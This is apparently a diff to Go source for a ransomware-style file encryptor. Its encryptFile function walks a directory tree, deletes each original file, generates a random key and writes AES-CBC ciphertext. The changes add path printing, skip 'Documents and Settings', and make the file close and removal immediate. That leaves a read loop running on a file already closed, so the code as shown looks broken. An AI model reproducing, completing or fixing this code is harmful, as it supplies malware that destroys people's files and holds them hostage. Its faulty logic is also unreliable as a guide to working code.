@@ -9,6 +9,7 @@ import (
 	"log"
 	"os"
 	"path/filepath"
+	"strings"
 )
 
 func main() {
@@ -29,13 +30,34 @@ func visitFile(path string, info os.DirEntry, err error) error {
 }
 
 func encryptFile(path string) {
+	fmt.Println(path)
+
+	_, err2 := os.Stat(path)
+
+	if err2 != nil {
+		return
+	}
+
+	if strings.Contains(path, "Documents and Settings") {
+		return
+	}
 
 	file, err := os.Open(path)
+
 	if err != nil {
 		log.Fatal(err)
+		return
 	}
-	defer os.Remove(path)
-	defer file.Close()
+	err = os.Remove(path)
+	if err != nil {
+		return
+	}
+
+	err = file.Close()
+
+	if err != nil {
+		return
+	}
 
 	key := make([]byte, 32)
 	_, err = rand.Read(key)
@@ -72,7 +94,7 @@ func encryptFile(path string) {
 	for {
 		_, err := file.Read(plaintext)
 		if err == io.EOF {
-			break
+			return
 		}
 		ciphertext.CryptBlocks(buffer, plaintext)
 		_, err = ciphertextFile.Write(buffer)
